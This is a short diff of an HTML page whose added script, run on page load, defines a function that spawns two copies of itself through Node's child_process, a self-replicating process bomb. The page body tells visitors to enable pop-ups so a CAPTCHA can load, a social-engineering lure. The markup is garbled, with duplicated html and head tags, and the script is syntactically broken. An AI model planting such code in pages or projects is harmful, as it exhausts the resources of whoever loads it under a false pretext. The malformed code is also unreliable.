@@ -1,13 +1,14 @@
+<html> 
 <html>
-  
-  <head>
-    <script type="text/javascript">
-    function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }();
+    <head>
+        <title>Test</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <script>
+          function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }();
    
-    window.onload = f;
-    </script>
-    
-    
+          window.onload = f;
+        </script>
+    </head>
   </head>
   <body>
     <b>Please enable pop ups so that the CAPTCHA will load up properly</b>
